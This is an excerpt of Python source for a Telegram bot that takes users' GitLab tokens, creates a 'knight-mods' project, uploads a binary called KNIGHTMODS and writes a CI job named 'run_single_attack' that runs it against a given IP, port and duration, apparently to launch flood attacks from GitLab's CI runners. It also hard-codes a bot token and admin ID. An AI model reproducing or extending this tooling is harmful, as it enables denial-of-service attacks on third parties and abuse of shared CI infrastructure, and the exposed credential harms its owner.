...
BOT_TOKEN = "7173238458:AAEgONpUq1AyVtwj2x2qE0TDwhoittMgF7o"
YML_FILE_PATH = ".gitlab-ci.yml"
BINARY_FILE_NAME = "KNIGHTMODS"
ATTACK_HISTORY_FILE = "attack_history.json"
ADMIN_IDS = [1250294887]
TARGET_PROJECT_NAME = "knight-mods"  # NEW: Name of project to auto-create
...
def find_or_create_project_in_group(token, group_id, project_name=TARGET_PROJECT_NAME):
    ...
    Args:
        ...
        project_name: Name of project to find or create (default: knight-mods)
...
def get_target_project_from_group(token, group_id, preferred_name="Lumen"):
    """
    Get target project from a group. Looks for preferred name first, then knight-mods, then first available.
    ...
    try:
        ...
        # Priority 2: Look for "knight-mods"
        for project in projects:
...
def setup_group_automatically(token, group_id, binary_content=None):
    """
    Automatically setup a group with knight-mods project, binary, and CI/CD.
    ...
    """
    try:
        # Step 1: Find or create knight-mods project
...
run_single_attack:
  ...
  script:
    ...
    - chmod +x ./KNIGHTMODS
    - ./KNIGHTMODS {ip} {port} {time_val} 999
"""
...
def upload_binary_to_single_project(token, project_id, binary_content):
    """
    Helper function to upload the 'KNIGHTMODS' binary file to a single GitLab project.
...
async def add_token_start(update: Update, user_id):
    ...
    await update.message.reply_text(
        ...
        "• Find or create 'knight-mods' project\n"
        "• Upload binary file\n"
...
async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if step == "binary_upload":
        ...
        try:
            ...
            # Save as 'KNIGHTMODS' for future use
